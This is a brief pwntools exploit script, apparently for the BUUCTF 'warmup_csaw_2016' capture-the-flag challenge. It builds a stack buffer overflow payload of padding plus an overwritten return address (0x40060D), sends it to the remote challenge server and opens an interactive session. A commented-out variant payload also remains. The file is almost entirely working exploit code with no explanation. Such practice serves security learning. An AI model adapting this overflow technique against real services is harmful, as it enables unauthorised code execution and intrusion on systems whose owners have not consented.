from pwn import *

path="/mnt/e/S/CTF/BUUCTF/PWN/warmup_csaw_2016"

#payload=b'a'*(128+8)+p64(0x00400596)
payload = b'a'*(0x40+8)+p64(0x40060D)
#sh=process(path)
sh=remote('node4.buuoj.cn',26511)

#sh.recvuntil(b">")

sh.sendline(payload)

sh.interactive()